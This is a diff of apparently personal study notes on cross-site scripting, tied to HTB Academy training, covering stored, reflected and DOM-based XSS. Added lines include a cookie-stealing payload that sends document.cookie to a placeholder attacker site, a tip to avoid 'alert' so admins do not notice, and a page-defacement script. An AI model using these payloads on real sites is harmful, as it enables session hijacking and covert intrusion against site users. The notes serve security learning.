@@ -2,8 +2,27 @@
 
 ## Stored XSS
 ### Discovery
-    > Can be verified if its persistent across sessions. For example, if you upload `<h1>test</h1>` and open the same page in an incognito window or another browser and it remains. Useful for stealing session cookies.
+> Look for user input on the page. Search fields, contact forms, etc. See if those return the values you submittied after entry
+> Can be verified if its persistent across sessions. For example, if you upload `<h1>test</h1>` and open the same page in an incognito window or another browser and it remains. Useful for stealing session cookies.  
 
+### Test Payloads
+Test with HTML
+```html
+# Should appear as a heading on the page
+<h1>test</h1>
+```
+Test with JS
+> Try to avoid using 'alert' to generate a pop up. This is probably logged and noticed by diligent admins
+```javascript
+# Should pop the print dialog for every user that visits the page.
+<script>print(1)</script>
+
+# Tries to print the session cookie
+<script>print(document.cookie)</script>
+
+# Common Cookie Stealer
+<script> var i = new Image; i.src="<Your website>/?"+document.cookie;</script>
+```
 
 ## Discovery
 ### DOM-Based
@@ -192,18 +211,6 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text"
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
 ```
 
-## Stored XSS (Persistent XSS)
-
-### Testing
-User input is shown on the page
-
-Test Payloads
-
-```html
-<script>alert(window.origin)</script> # This will pop up a window showing the source URL for the popup window(iframes)
-<script>print()</script> # Will pop up the printer dialog
-<plaintext> # Should render the rest of the page as plain text.
-```
 To verify the payload is stored on the back-end, refresh the page. If the alert comes back, it's stored/persistent
 
 ## Reflected XSS
@@ -239,9 +246,7 @@ Common JS Functions that write to DOM objects:
 document.write()
 DOM.innerHTML
 DOM.outerHTML
-```
-
-Common jQuery library functions that write to DOM objects
+```Common jQuery library functions that write to DOM objects
 ```javascript
 add()
 after()
